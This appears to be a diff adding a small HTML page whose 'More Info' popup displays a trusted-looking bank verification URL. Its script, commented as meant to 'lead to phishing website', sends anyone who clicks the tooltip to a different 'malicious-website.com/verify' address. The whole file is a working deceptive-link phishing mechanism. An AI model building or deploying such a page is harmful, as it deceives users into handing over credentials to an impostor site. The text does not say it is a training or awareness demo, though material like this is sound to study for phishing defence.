@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+/* Popup container */
+
+.content {
+    text-align: center;
+  }
+
+.popup-container {
+   
+  position: relative;
+  display: inline-block;
+  cursor: pointer;
+}
+
+/* The actual popup (appears on top) */
+.popup-container .popuptooltip {
+  visibility: hidden;
+  width: max-content;
+  background-color: #555;
+  color: #fff;
+  text-align: center;
+  border-radius: 6px;
+  padding: 8px 0;
+  position: absolute;
+  z-index: 1;
+  bottom: 125%;
+  left: 5%;
+  margin-left: -80px;
+}
+
+/* Popup arrow */
+.popup-container .popuptooltip::after {
+  content: "";
+  position: absolute;
+  top: 100%;
+  left: 50%;
+  margin-left: -5px;
+  border-width: 5px;
+  border-style: solid;
+  border-color: #555 transparent transparent transparent;
+}
+
+/* Toggle this class when clicking on the popup container (hide and show the popup) */
+.popup-container .show {
+  visibility: visible;
+  -webkit-animation: fadeIn 0.5s;
+  animation: fadeIn 0.5s
+}
+
+/* Add animation (fade in the popup) */
+@-webkit-keyframes fadeIn {
+  from {opacity: 0;}
+  to {opacity: 1;}
+}
+
+@keyframes fadeIn {
+  from {opacity: 0;}
+  to {opacity:1 ;}
+}
+
+
+</style>
+
+<body>
+    <br><br><br>
+    <div class="content">
+        <div class="popup-container" onclick="PopUpFunction()">More Info
+            <span class="popuptooltip" id="Poptooltip"  >https://www.trustedbank.com/verify</span>
+        </div>
+    </div>
+
+
+
+</body>
+
+<!-- Javascript -->  
+    <script>
+        // When the user clicks on <div>, open the popup
+
+        function PopUpFunction() {
+        var popup = document.getElementById("Poptooltip");
+        popup.classList.toggle("show");
+        } 
+
+        
+        /* let tooltip be clickable and lead to phishing website */
+        document.getElementById("Poptooltip").addEventListener("click", function() {
+            window.location.href = "https://malicious-website.com/verify";
+        });
+
+    </script> 
+
+    
